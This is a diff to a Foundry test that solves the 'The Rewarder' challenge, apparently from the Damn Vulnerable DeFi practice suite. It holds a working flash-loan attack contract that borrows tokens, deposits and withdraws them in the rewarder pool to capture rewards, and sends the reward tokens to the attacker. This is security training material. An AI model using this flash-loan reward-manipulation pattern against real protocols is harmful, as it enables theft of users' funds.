@@ -88,7 +88,7 @@ contract TheRewarder is Test {
         /**
          * EXPLOIT START *
          */
-         vm.warp(block.timestamp + 5 days);
+        vm.warp(block.timestamp + 5 days);
         vm.startPrank(attacker);
         FlashloanAttack attack = new FlashloanAttack(attacker, address(theRewarderPool), address(flashLoanerPool), address(dvt));
         attack.attack();
@@ -136,19 +136,14 @@ contract FlashloanAttack{
         dvt = DamnValuableToken(_dvt);
     }
 
-
-
     function attack() external {
         flashloan.flashLoan(1_000_000e18);
     }
 
     function receiveFlashLoan(uint256 amount) external {
         dvt.approve(address(rewarderPool), amount);
-        rewarderPool.deposit(1000000e18);
-        rewarderPool.withdraw(1000000e18);
-       // dvt.transfer(_attacker, amount);   
-        // address(rewarderPool).delegatecall(abi.encodeWithSignature("deposit(uint256)", amount)) ;
-        // address(rewarderPool).delegatecall(abi.encodeWithSignature("withdraw(uint256)", amount));
+        rewarderPool.deposit(1_000_000e18);
+        rewarderPool.withdraw(1_000_000e18);
         rewarderPool.rewardToken().transfer(attacker, rewarderPool.rewardToken().balanceOf(address(this)));
         dvt.transfer(address(flashloan), amount);
     }
